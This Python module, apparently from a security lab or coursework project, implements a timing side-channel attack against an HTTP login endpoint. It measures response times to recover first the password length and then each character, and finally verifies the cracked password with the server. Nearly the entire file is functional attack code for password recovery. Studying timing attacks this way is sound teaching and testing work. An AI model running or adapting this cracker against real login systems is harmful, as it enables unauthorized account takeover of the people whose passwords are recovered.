"""
Main timing attack orchestrator.

Implements IAttackStrategy interface using timing side-channel technique.

Author: Your Name
Date: 2025
"""

from typing import Dict, List
from dataclasses import dataclass

from core.interfaces import (
    IAttackStrategy, IHttpClient, ITimingAnalyzer,
    TimingMeasurement, CharacterAnalysis
)
from core.exceptions import AttackFailedException
from services.timing_service import TimingService, SamplingStrategy
from utils.logger import Logger


@dataclass
class AttackConfig:
    """Configuration for the timing attack."""
    charset: str = "abcdefghijklmnopqrstuvwxyz"
    max_length: int = 32
    verify_each_char: bool = True  # Verify after each character


class TimingAttacker(IAttackStrategy):
    """
    Character-by-character timing attack implementation.

    Algorithm:
    1. Start with empty password
    2. For each position:
        a. Try all possible characters
        b. Measure timing for each
        c. Select character with longest time
        d. Verify selection (optional)
    3. Repeat until complete password found

    Why this works:
    - Naive comparison stops at first mismatch
    - Correct characters proceed to next position
    - Extra comparison = measurable time difference

    Example:
        >>> config = AttackConfig(charset="abc", max_length=3)
        >>> attacker = TimingAttacker(http_client, analyzer, timing_service, config)
        >>> password = attacker.crack_password("user123", difficulty=1, max_length=32)
        >>> print(f"Recovered: {password}")
    """

    def __init__(
        self,
        http_client: IHttpClient,
        timing_analyzer: ITimingAnalyzer,
        timing_service: TimingService,
        config: AttackConfig,
        logger: Logger
    ):
        """
        Initialize timing attacker.

        Args:
            http_client: HTTP client for server communication
            timing_analyzer: Statistical analyzer for timing data
            timing_service: Service for collecting timing measurements
            config: Attack configuration
            logger: Logger instance
        """
        self.http_client = http_client
        self.timing_analyzer = timing_analyzer
        self.timing_service = timing_service
        self.config = config
        self.logger = logger

    def crack_password(
        self,
        username: str,
        difficulty: int,
        max_length: int
    ) -> str:
        """
        Execute the timing attack to recover the password.

        Two-phase approach:
        1. Phase 1: Discover password length using timing analysis
        2. Phase 2: Discover each character using known length

        Args:
            username: Target username
            difficulty: Attack difficulty level
            max_length: Maximum password length to try

        Returns:
            The recovered password

        Raises:
            AttackFailedException: If unable to recover password
        """
        self.logger.info(f"Starting two-phase timing attack on user '{username}' (difficulty {difficulty})")
        self.logger.info(f"Charset: {self.config.charset} ({len(self.config.charset)} chars)")

        # Phase 1: Discover password length
        self.logger.info(f"\n{'='*60}")
        self.logger.info("PHASE 1: Discovering password length")
        self.logger.info(f"{'='*60}")

        password_length = self._discover_password_length(username, difficulty, max_length)

        if password_length is None:
            self.logger.error("Failed to discover password length")
            raise AttackFailedException(0, "Could not determine password length")

        self.logger.info(f"[+] Discovered password length: {password_length}")

        # Phase 2: Discover characters with known length
        self.logger.info(f"\n{'='*60}")
        self.logger.info(f"PHASE 2: Discovering characters (length={password_length})")
        self.logger.info(f"{'='*60}")

        password = self._discover_password_characters(
            username, difficulty, password_length
        )

        # Final verification
        if self._verify_password(password, username, difficulty):
            self.logger.info(f"[+] Password successfully recovered: '{password}'")
            return password
        else:
            self.logger.error(f"Final verification failed for: '{password}'")
            raise AttackFailedException(password_length, "Password verification failed")

    def _discover_password_length(
        self,
        username: str,
        difficulty: int,
        max_length: int
    ) -> int:
        """
        Discover the password length using timing analysis.

        Strategy: Test different length prefixes filled with random chars.
        The correct length will show a timing spike because the comparison
        continues beyond the length check.

        Args:
            username: Target username
            difficulty: Difficulty level
            max_length: Maximum length to test

        Returns:
            The discovered password length, or None if not found
        """
        self.logger.info(f"Testing password lengths from 1 to {max_length}")

        # Build test passwords of different lengths using first char of charset
        test_char = self.config.charset[0]
        length_timings: Dict[int, List[TimingMeasurement]] = {}

        for length in range(1, max_length + 1):
            test_password = test_char * length

            try:
                measurements = self.timing_service.measure_candidate(
                    test_password, username, difficulty, position=0
                )

                # Check if we accidentally guessed the password
                if measurements and measurements[0].is_correct:
                    self.logger.info(f"[+] Found correct password during length test: {test_password}")
                    return length

                length_timings[length] = measurements

                # Log the average timing
                avg_time = sum(m.elapsed_time for m in measurements) / len(measurements)
                self.logger.debug(f"Length {length}: avg={avg_time:.6f}s ({len(measurements)} samples)")

            except Exception as e:
                self.logger.warning(f"Failed to measure length {length}: {str(e)}")
                length_timings[length] = []

        # Analyze timing data to find the length
        analyses: List[CharacterAnalysis] = []

        for length, measurements in length_timings.items():
            if not measurements:
                continue

            analysis = self.timing_analyzer.analyze_measurements(measurements)
            # Store length in the character field for comparison
            analysis.character = str(length)
            analyses.append(analysis)

        if not analyses:
            self.logger.error("No valid length measurements")
            return None

        # Select the length with highest timing
        best_length_str, confidence = self.timing_analyzer.compare_candidates(analyses)
        best_length = int(best_length_str)

        self.logger.info(f"Length analysis: {best_length} (confidence: {confidence:.3f})")

        if confidence < 0.3:
            self.logger.warning(f"Low confidence in length detection ({confidence:.3f})")

        return best_length

    def _discover_password_characters(
        self,
        username: str,
        difficulty: int,
        password_length: int
    ) -> str:
        """
        Discover password characters with known length.

        Args:
            username: Target username
            difficulty: Difficulty level
            password_length: Known password length

        Returns:
            The discovered password

        Raises:
            AttackFailedException: If character discovery fails
        """
        password = ""

        for position in range(password_length):
            self.logger.info(f"\n{'='*60}")
            self.logger.info(f"Position {position}/{password_length}: '{password}'")
            self.logger.info(f"{'='*60}")

            # Try to find next character
            try:
                next_char = self._crack_next_character(
                    password, username, difficulty, position, password_length
                )

                if next_char is None:
                    self.logger.error(f"Failed to find character at position {position}")
                    raise AttackFailedException(position, "Character discovery failed")

                password += next_char
                self.logger.info(f"[+] Found character: '{next_char}' -> '{password}'")

            except Exception as e:
                self.logger.error(f"Attack failed at position {position}: {str(e)}")
                raise AttackFailedException(position, str(e))

        return password

    def _crack_next_character(
        self,
        current_password: str,
        username: str,
        difficulty: int,
        position: int,
        password_length: int
    ) -> str:
        """
        Discover the next character of the password.

        Args:
            current_password: Password prefix discovered so far
            username: Target username
            difficulty: Difficulty level
            position: Current position being tested
            password_length: Known total password length (for padding)

        Returns:
            The discovered character, or None if password is complete
        """
        # Measure all candidate characters with padding
        measurements_dict = self.timing_service.measure_all_candidates(
            current_password=current_password,
            charset=self.config.charset,
            username=username,
            difficulty=difficulty,
            position=position,
            password_length=password_length
        )

        # Check if we found complete password during measurement
        for char, measurements in measurements_dict.items():
            if measurements and measurements[0].is_correct:
                return char

        # Analyze timing data for each character
        analyses: List[CharacterAnalysis] = []

        for char, measurements in measurements_dict.items():
            if not measurements:
                self.logger.warning(f"No valid measurements for '{char}'")
                continue

            analysis = self.timing_analyzer.analyze_measurements(measurements)
            analyses.append(analysis)

        if not analyses:
            self.logger.error("No valid character analyses")
            return None

        # Select best candidate
        best_char, confidence = self.timing_analyzer.compare_candidates(analyses)

        self.logger.info(
            f"Selected: '{best_char}' (confidence: {confidence:.3f})"
        )

        # Warn if low confidence
        if confidence < 0.5:
            self.logger.warning(
                f"Low confidence ({confidence:.3f}) - result may be unreliable"
            )

        return best_char

    def _verify_password(
        self,
        password: str,
        username: str,
        difficulty: int
    ) -> bool:
        """
        Verify if the current password is complete and correct.

        Args:
            password: Password to verify
            username: Target username
            difficulty: Difficulty level

        Returns:
            True if password is complete and correct
        """
        measurement = self.http_client.send_request(password, username, difficulty)
        return measurement.is_correct